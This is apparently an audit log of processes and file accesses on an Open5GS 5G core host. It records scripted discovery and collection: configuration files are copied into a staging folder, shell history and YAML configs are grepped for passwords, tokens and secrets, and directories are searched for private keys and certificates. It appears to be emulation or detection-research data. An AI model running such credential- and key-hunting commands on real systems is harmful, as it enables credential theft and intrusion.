+2026-10-02T20:09:20.817962458Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:09:20.818008591Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:09:20.818022929Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:09:20.818033512Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:09:20.818038919Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:09:20.818046658Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:09:20.818057758Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:09:20.818105677Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:09:20.818112123Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:09:20.818134376Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:09:20.818139450Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:09:20.818158015Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:09:20.818175570Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:09:20.818241427Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:09:20.818247794Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:09:20.818256031Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:09:20.818261230Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:09:20.818267890Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:09:20.818276784Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:09:20.818312313Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:09:20.818318828Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:09:20.818326913Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:09:20.818332356Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:09:20.818338609Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:09:20.818347025Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:09:20.818399113Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:09:20.818406064Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:09:20.818414825Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:09:20.818420022Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:09:20.818426184Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:09:20.818434010Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:09:20.818474735Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:09:20.818481397Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:09:20.818489249Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:09:20.818494384Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:09:20.818500630Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:09:20.818507951Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:09:20.818559454Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:09:20.818565645Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:09:20.818606971Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:09:20.818612695Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:09:20.818627510Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:09:20.818643026Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:10:14.977081877Z | EXEC | PID=963874 | PPID=937778 | /bin/sh | -c "find / -name '*.yaml' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5 | tee -a /tmp/thesis-discovery.log"
+2026-10-02T20:10:14.979514712Z | EXEC | PID=963875 | PPID=963874 | /usr/bin/find | / -name *.yaml -type f -not -path */\.* -size -500k
+2026-10-02T20:10:14.979756547Z | EXEC | PID=963876 | PPID=963874 | /usr/bin/head | -5
+2026-10-02T20:10:14.980257420Z | EXEC | PID=963877 | PPID=963874 | /usr/bin/tee | -a /tmp/thesis-discovery.log
+2026-10-02T20:10:15.032293851Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:10:15.032327403Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:10:15.032346723Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:10:15.032351535Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:10:15.032375581Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:10:15.032382383Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:10:15.032389563Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:10:15.032401843Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:10:15.032441733Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:10:15.032450452Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:10:15.032523743Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:10:15.032536507Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:10:15.032601687Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:10:15.032641820Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:10:15.032710898Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:10:15.032726963Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:10:15.032740054Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:10:15.032751746Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:10:15.032773089Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:10:15.032792943Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:10:15.032919584Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:10:15.032901686Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:10:15.032910633Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:10:15.032915612Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:10:15.032927458Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:10:15.032938261Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:10:15.032993353Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:10:15.033009226Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:10:15.033027181Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:10:15.033039275Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:10:15.033053785Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:10:15.033108879Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:10:15.033177044Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:10:15.033183959Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:10:15.033201304Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:10:15.033206559Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:10:15.033219071Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:10:15.033233467Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:10:15.033391664Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:10:15.033399994Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:10:15.033444863Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:10:15.033452753Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:10:15.033462375Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:10:15.033477311Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:10:15.033782874Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:10:15.033800903Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:10:15.033835370Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:10:15.033841565Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:10:15.033860795Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:10:15.033893409Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:10:15.034131982Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:10:15.034149568Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:10:15.034166709Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:10:15.034189652Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:10:15.034198939Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:10:15.034209988Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:10:15.034257867Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:10:15.034264841Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:10:15.034274334Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:10:15.034279670Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:10:15.034287044Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:10:15.034296192Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:10:15.034330796Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:10:15.034346697Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:10:15.034371181Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:10:15.034378157Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:10:15.034384566Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:10:15.034394047Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:10:15.034457218Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:10:15.034473484Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:10:15.034483164Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:10:15.034504728Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:10:15.034496577Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:10:15.034511328Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:10:15.034573167Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:10:15.034587727Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:10:15.034604807Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:10:15.034616663Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:10:15.034630773Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:10:15.034672017Z | READ | PID=963875 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:11:15.061093119Z | EXEC | PID=965671 | PPID=937778 | /bin/sh | -c "mkdir -p staged && echo $PWD/staged"
+2026-10-02T20:11:15.063621146Z | EXEC | PID=965672 | PPID=965671 | /bin/mkdir | -p staged
+2026-10-02T20:12:12.083679180Z | EXEC | PID=967422 | PPID=937778 | /bin/sh | -c "cp /opt/open5gs/etc/open5gs/amf.yaml /opt/open5gs/staged"
+2026-10-02T20:12:12.085536411Z | EXEC | PID=967423 | PPID=967422 | /bin/cp | /opt/open5gs/etc/open5gs/amf.yaml /opt/open5gs/staged
+2026-10-02T20:12:12.088073637Z | READ | PID=967423 | /bin/cp | /opt/open5gs/etc/open5gs/amf.yaml
+2026-10-02T20:12:12.088102391Z | READ | PID=967423 | /bin/cp | /opt/open5gs/etc/open5gs/amf.yaml
+2026-10-02T20:12:12.088137021Z | WRITE | PID=967423 | /bin/cp | /opt/open5gs/staged/amf.yaml
+2026-10-02T20:12:12.088153222Z | WRITE | PID=967423 | /bin/cp | /opt/open5gs/staged/amf.yaml
+2026-10-02T20:12:12.088207Z | READ | PID=967423 | /bin/cp | /opt/open5gs/etc/open5gs/amf.yaml
+2026-10-02T20:12:12.088221237Z | READ | PID=967423 | /bin/cp | /opt/open5gs/etc/open5gs/amf.yaml
+2026-10-02T20:12:55.125945114Z | EXEC | PID=968749 | PPID=937778 | /bin/sh | -c "cp /opt/open5gs/etc/open5gs/ausf.yaml /opt/open5gs/staged"
+2026-10-02T20:12:55.127345637Z | EXEC | PID=968750 | PPID=968749 | /bin/cp | /opt/open5gs/etc/open5gs/ausf.yaml /opt/open5gs/staged
+2026-10-02T20:12:55.129446888Z | READ | PID=968750 | /bin/cp | /opt/open5gs/etc/open5gs/ausf.yaml
+2026-10-02T20:12:55.129463992Z | READ | PID=968750 | /bin/cp | /opt/open5gs/etc/open5gs/ausf.yaml
+2026-10-02T20:12:55.129490944Z | WRITE | PID=968750 | /bin/cp | /opt/open5gs/staged/ausf.yaml
+2026-10-02T20:12:55.129499375Z | WRITE | PID=968750 | /bin/cp | /opt/open5gs/staged/ausf.yaml
+2026-10-02T20:12:55.129538592Z | READ | PID=968750 | /bin/cp | /opt/open5gs/etc/open5gs/ausf.yaml
+2026-10-02T20:12:55.129543478Z | READ | PID=968750 | /bin/cp | /opt/open5gs/etc/open5gs/ausf.yaml
+2026-10-02T20:13:27.143687502Z | EXEC | PID=969809 | PPID=937778 | /bin/sh | -c "cp /usr/share/pixmaps/debian-logo.png /opt/open5gs/staged"
+2026-10-02T20:13:27.145313632Z | EXEC | PID=969810 | PPID=969809 | /bin/cp | /usr/share/pixmaps/debian-logo.png /opt/open5gs/staged
+2026-10-02T20:13:27.147415228Z | WRITE | PID=969810 | /bin/cp | /opt/open5gs/staged/debian-logo.png
+2026-10-02T20:13:27.147434203Z | WRITE | PID=969810 | /bin/cp | /opt/open5gs/staged/debian-logo.png
+2026-10-02T20:14:15.509685679Z | EXEC | PID=971210 | PPID=937778 | /bin/sh | -c "cat ~/.bash_history | grep -iE 'pass|database|db|token|secret|ssh|curl|ping' | tee -a /tmp/thesis-discovery.log"
+2026-10-02T20:14:15.511741265Z | EXEC | PID=971212 | PPID=971210 | /bin/grep | -iE pass|database|db|token|secret|ssh|curl|ping
+2026-10-02T20:14:15.511894988Z | EXEC | PID=971211 | PPID=971210 | /bin/cat | /opt/open5gs/.bash_history
+2026-10-02T20:14:15.512037401Z | EXEC | PID=971213 | PPID=971210 | /usr/bin/tee | -a /tmp/thesis-discovery.log
+2026-10-02T20:14:15.512852129Z | READ | PID=971211 | /bin/cat | /opt/open5gs/.bash_history
+2026-10-02T20:14:15.512879888Z | READ | PID=971211 | /bin/cat | /opt/open5gs/.bash_history
+2026-10-02T20:15:12.200864379Z | EXEC | PID=972994 | PPID=937778 | /bin/sh | -c "grep -ri 'password' /opt/open5gs/etc/open5gs \  --include='*.yaml' \  --include='*.yml' \  2>/dev/null| tee -a /tmp/thesis-discovery.log; exit 0"
+2026-10-02T20:15:12.202664080Z | EXEC | PID=972995 | PPID=972994 | /bin/grep | -ri password /opt/open5gs/etc/open5gs " " --include=*.yaml " " --include=*.yml " "
+2026-10-02T20:15:12.203157245Z | EXEC | PID=972996 | PPID=972994 | /usr/bin/tee | -a /tmp/thesis-discovery.log
+2026-10-02T20:15:12.204290284Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:12.204333079Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:12.204383423Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:12.204401867Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:12.204418308Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:12.204446432Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:12.204500578Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/ausf.yaml
+2026-10-02T20:15:12.204505092Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/ausf.yaml
+2026-10-02T20:15:12.204525154Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/ausf.yaml
+2026-10-02T20:15:12.204528948Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/ausf.yaml
+2026-10-02T20:15:12.204553668Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/amf.yaml
+2026-10-02T20:15:12.204557652Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/amf.yaml
+2026-10-02T20:15:12.204577389Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/amf.yaml
+2026-10-02T20:15:12.204580867Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/amf.yaml
+2026-10-02T20:15:12.204603927Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/bsf.yaml
+2026-10-02T20:15:12.204607631Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/bsf.yaml
+2026-10-02T20:15:12.204630264Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/bsf.yaml
+2026-10-02T20:15:12.204633965Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/bsf.yaml
+2026-10-02T20:15:12.204690082Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:12.204701100Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:12.204714600Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:12.204721836Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:12.204732379Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:12.204743735Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:12.204774247Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/smf.yaml
+2026-10-02T20:15:12.204778280Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/smf.yaml
+2026-10-02T20:15:12.204825316Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/smf.yaml
+2026-10-02T20:15:12.204829825Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/smf.yaml
+2026-10-02T20:15:12.204856289Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/upf.yaml
+2026-10-02T20:15:12.204860586Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/upf.yaml
+2026-10-02T20:15:12.204881279Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/upf.yaml
+2026-10-02T20:15:12.204884385Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/upf.yaml
+2026-10-02T20:15:12.204907972Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/udr.yaml
+2026-10-02T20:15:12.204917867Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/udr.yaml
+2026-10-02T20:15:12.204940535Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sepp1.yaml
+2026-10-02T20:15:12.204944340Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sepp1.yaml
+2026-10-02T20:15:12.205002364Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sepp1.yaml
+2026-10-02T20:15:12.205007387Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sepp1.yaml
+2026-10-02T20:15:12.205034112Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sepp2.yaml
+2026-10-02T20:15:12.205037996Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sepp2.yaml
+2026-10-02T20:15:12.205074239Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sepp2.yaml
+2026-10-02T20:15:12.205077871Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sepp2.yaml
+2026-10-02T20:15:12.205167185Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/nssf.yaml
+2026-10-02T20:15:12.205107419Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/nssf.yaml
+2026-10-02T20:15:12.205126617Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/nssf.yaml
+2026-10-02T20:15:12.205130335Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/nssf.yaml
+2026-10-02T20:15:12.205153959Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/pcrf.yaml
+2026-10-02T20:15:12.205158121Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/pcrf.yaml
+2026-10-02T20:15:12.205177156Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/pcrf.yaml
+2026-10-02T20:15:12.205181324Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/pcrf.yaml
+2026-10-02T20:15:12.205204605Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/nrf.yaml
+2026-10-02T20:15:12.205208774Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/nrf.yaml
+2026-10-02T20:15:12.205225649Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/nrf.yaml
+2026-10-02T20:15:12.205229440Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/nrf.yaml
+2026-10-02T20:15:12.205252975Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/pcf.yaml
+2026-10-02T20:15:12.205256680Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/pcf.yaml
+2026-10-02T20:15:12.205295327Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/pcf.yaml
+2026-10-02T20:15:12.205299434Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/pcf.yaml
+2026-10-02T20:15:12.205332599Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/udm.yaml
+2026-10-02T20:15:12.205336536Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/udm.yaml
+2026-10-02T20:15:12.205402103Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/udm.yaml
+2026-10-02T20:15:12.205407604Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/udm.yaml
+2026-10-02T20:15:12.205450147Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:12.205457046Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:12.205489144Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:12.205496149Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:12.205515007Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:12.205547127Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:12.205585737Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/mme.yaml
+2026-10-02T20:15:12.205590457Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/mme.yaml
+2026-10-02T20:15:12.205620189Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/mme.yaml
+2026-10-02T20:15:12.205623969Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/mme.yaml
+2026-10-02T20:15:12.205648785Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/scp.yaml
+2026-10-02T20:15:12.205652866Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/scp.yaml
+2026-10-02T20:15:12.205671839Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/scp.yaml
+2026-10-02T20:15:12.205675598Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/scp.yaml
+2026-10-02T20:15:12.205699085Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sgwu.yaml
+2026-10-02T20:15:12.205703091Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sgwu.yaml
+2026-10-02T20:15:12.205719763Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sgwu.yaml
+2026-10-02T20:15:12.205723644Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sgwu.yaml
+2026-10-02T20:15:12.205746504Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/hss.yaml
+2026-10-02T20:15:12.205750943Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/hss.yaml
+2026-10-02T20:15:12.205767845Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/hss.yaml
+2026-10-02T20:15:12.205771180Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/hss.yaml
+2026-10-02T20:15:12.205794395Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sgwc.yaml
+2026-10-02T20:15:12.205798055Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sgwc.yaml
+2026-10-02T20:15:12.205816072Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sgwc.yaml
+2026-10-02T20:15:12.205819414Z | READ | PID=972995 | /bin/grep | /opt/open5gs/etc/open5gs/sgwc.yaml
+2026-10-02T20:15:54.088168099Z | EXEC | PID=974265 | PPID=937778 | /bin/sh | -c "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /opt/open5gs/etc -maxdepth 3 -name "*${i}" 2>/dev/null;done | tee -a /tmp/thesis-discovery.log ; exit 0"
+2026-10-02T20:15:54.089949571Z | EXEC | PID=974268 | PPID=974266 | /usr/bin/find | /opt/open5gs/etc -maxdepth 3 -name *.key
